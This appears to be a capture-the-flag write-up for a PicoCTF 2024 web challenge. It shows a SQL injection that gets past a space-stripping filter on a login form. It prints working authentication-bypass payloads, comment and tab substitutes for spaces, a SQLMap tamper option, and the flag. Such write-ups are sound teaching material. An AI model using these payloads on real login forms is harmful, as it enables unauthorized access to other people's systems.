---
layout: writeup
title: "Injection Point — PicoCTF 2024"
description: "Classic SQL injection in a login form with a twist — the backend was filtering spaces, requiring whitespace bypass techniques."
category: web
difficulty: easy
event: "PicoCTF 2024"
date: 2024-03-15
flag: "picoCTF{sql_1nj3ct10n_1s_fun_abc123}"
---

## Challenge Overview

We're given a login page. The description hints that "not all inputs are validated equally." Time to poke around.

## Reconnaissance

Opening Burp Suite and intercepting the login request:

```http
POST /login HTTP/1.1
Host: challenge.picoctf.org:12345
Content-Type: application/x-www-form-urlencoded

username=admin&password=test
```

Running a quick SQLMap scan first — it confirms injection but can't dump because of the WAF.

## Identifying the Filter

The backend strips literal spaces. Payload `' OR 1=1--` returns a 400. But `'/**/OR/**/1=1--` goes through — MySQL comment syntax as a space substitute.

## Exploitation

Final payload:

```sql
'/**/OR/**/'1'='1'--
```

Plugging it into the username field:

```
username='/**/OR/**/'1'='1'--&password=anything
```

We're in as `admin`. The flag is on the next page.

## Key Takeaways

- Always check if WAFs are filtering spaces — `/**/` and `%09` (tab) are common bypasses
- SQLMap's `--tamper=space2comment` script automates this
- The login query was likely: `SELECT * FROM users WHERE username='$user' AND password='$pass'`

## Tools Used

- Burp Suite
- SQLMap (`--tamper=space2comment`)
- curl
